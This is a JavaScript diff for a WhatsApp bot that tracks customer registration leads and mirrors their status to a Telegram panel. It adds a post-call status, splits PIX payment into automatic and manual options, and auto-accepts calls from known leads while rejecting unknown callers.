@@ -294,6 +294,7 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
     } else if (status === 'human') {
         if (humanStep === 1) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: PENDENTE 📵)</b>';
         else if (humanStep === 2) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: CONCLUÍDA ✅)</b>';
+        else if (humanStep === 21) statusMsg = '📞 <b>LIGAÇÃO ENCERRADA — Etapa 2 CONCLUÍDA ✅ | PIX Pendente</b>';
         else if (humanStep >= 3) statusMsg = `👤 <b>EM ATENDIMENTO (Etapa ${humanStep} ATIVA)</b>`;
         else statusMsg = '👤 <b>ATENDIMENTO MANUAL ATIVO</b>';
     }
@@ -316,10 +317,11 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', huma
                 { text: e3Label, callback_data: `etapa:3:${chatId}` }
             ],
             [
-                { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_std:${chatId}` },
-                { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }
+                { text: "⚡ PIX Automático (Gateway)", callback_data: `pix_sel:auto:${chatId}` },
+                { text: "🛠️ PIX Manual (Chave)", callback_data: `pix_sel:manual:${chatId}` }
             ],
             [
+                { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` },
                 { text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }
             ]
         ]
@@ -446,6 +448,12 @@ client.on('incoming_call', async (call) => {
             const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
             await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
         }
+
+        // Tenta aceitar a chamada automaticamente (não interrompe se falhar)
+        try { await call.accept(); } catch (_) {}
+    } else {
+        // Lead desconhecido ligando — registra no Telegram
+        try { await call.reject(); } catch (_) {}
     }
 });
 
@@ -669,42 +677,55 @@ client.on('message_create', async (msg) => {
         if (currentSession) {
             currentSession.isCalling = false;
 
-            // Se a ligação acabou e ele ainda estava na Etapa 2, 
-            // marcamos como PENDENTE novamente se o lead desligou (ou a call acabou)
-            // mas marcamos como CONCLUÍDA se foi atendida.
-            if (currentSession.mode === 'human' && currentSession.humanStep <= 2) {
+            if (currentSession.mode === 'human') {
                 if (callAnswered) {
-                    currentSession.humanStep = 2; // Concluída (mas agora desligada)
-                    // Opcional: Se o user quer que volte a ser PENDENTE assim que desliga:
-                    currentSession.humanStep = 1;
-                    console.log(`📞 [CALL] Ligação atendida e encerrada por ${targetChatId} — Status: Pendente para próxima ação.`);
-                } else {
-                    currentSession.humanStep = 1; // Perdida -> Pendente
-                    console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
-                }
+                    // Ligação atendida e encerrada → Etapa 2 CONCLUÍDA
+                    currentSession.humanStep = 21; // código especial: 21 = call encerrada, etapa 2 concluída, aguardando PIX
+                    console.log(`📞 [CALL] Ligação atendida e encerrada por ${targetChatId} — Etapa 2 CONCLUÍDA. Aguardando PIX.`);
 
-                chatSessions.set(targetChatId, currentSession);
-                saveSessions();
+                    chatSessions.set(targetChatId, currentSession);
+                    saveSessions();
 
-                // Atualiza painel principal no Telegram
-                if (currentSession.tgMsgId) {
-                    const { text: txt, reply_markup } = buildCadastroMessage(
-                        targetChatId,
-                        currentSession.name,
-                        currentSession.birthDate,
-                        'human',
-                        currentSession.docType,
-                        currentSession.humanStep,
-                        false
-                    );
-                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
-                }
+                    // Atualiza painel no Telegram mostrando status pós-ligação
+                    if (currentSession.tgMsgId) {
+                        const { text: txt, reply_markup } = buildCadastroMessage(
+                            targetChatId,
+                            currentSession.name,
+                            currentSession.birthDate,
+                            'human',
+                            currentSession.docType,
+                            21, // step especial
+                            false
+                        );
+                        await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                    }
 
-                if (callAnswered) {
-                    // Envia mensagem de Etapa 2 concluída ao lead (opcional se quiser manter)
+                    // Envia mensagem de Etapa 2 concluída ao lead
                     setTimeout(async () => {
                         try { await sendBotMessage(targetChatId, MENSAGEM_ETAPA_2_CONCLUIDA); } catch (e) { }
                     }, 2000);
+
+                } else {
+                    // Ligação perdida/não atendida → mantém Pendente
+                    currentSession.humanStep = 1;
+                    console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
+
+                    chatSessions.set(targetChatId, currentSession);
+                    saveSessions();
+
+                    // Atualiza painel no Telegram
+                    if (currentSession.tgMsgId) {
+                        const { text: txt, reply_markup } = buildCadastroMessage(
+                            targetChatId,
+                            currentSession.name,
+                            currentSession.birthDate,
+                            'human',
+                            currentSession.docType,
+                            1,
+                            false
+                        );
+                        await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                    }
                 }
             }
         }
